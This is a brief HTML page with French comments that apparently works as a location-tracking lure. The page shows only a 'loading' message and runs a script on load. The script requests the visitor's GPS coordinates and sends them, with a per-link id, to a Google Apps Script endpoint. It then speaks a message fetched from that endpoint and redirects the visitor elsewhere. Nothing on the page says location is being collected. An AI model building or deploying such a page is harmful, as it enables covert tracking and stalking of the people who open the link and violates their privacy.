<!DOCTYPE html>
<html>
<head>
  <title>Localisation</title>
  <script>
    async function sendLocation() {
      const urlParams = new URLSearchParams(window.location.search);
      const id = urlParams.get('id'); // ID unique dans l'URL

      try {
        const position = await new Promise((resolve, reject) =>
          navigator.geolocation.getCurrentPosition(resolve, reject)
        );

        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        const scriptURL = 'https://script.google.com/macros/s/AKfycbyRfQdh835AIwT0YOXUFRYAsFKAQo9dduW7QmNCbMbofjozVQ3nxlbD3lnd1zn6mDk2/exec';

        const data = new FormData();
        data.append('id', id);
        data.append('latitude', latitude);
        data.append('longitude', longitude);

        // Envoi des données GPS
        await fetch(scriptURL, { method: 'POST', body: data });

        // Récupération de l’URL + message vocal
        const response = await fetch(scriptURL + '?getRedirectURL=true');
        const json = await response.json();

        // Lecture du message à voix haute
        const synth = window.speechSynthesis;
        const utter = new SpeechSynthesisUtterance(json.message);
        utter.lang = "fr-FR";
        synth.speak(utter);

        // Attendre que la lecture se termine avant de rediriger
        utter.onend = () => {
          let finalURL = json.redirect.trim();
          if (!finalURL.startsWith('http')) {
            finalURL = 'https://' + finalURL;
          }
          window.location.replace(finalURL);
        };

      } catch (error) {
        alert("Impossible d’obtenir la localisation : " + error.message);
      }
    }

    window.onload = sendLocation;
  </script>
</head>
<body>
  <p>Chargement en cours...</p>
</body>
</html>
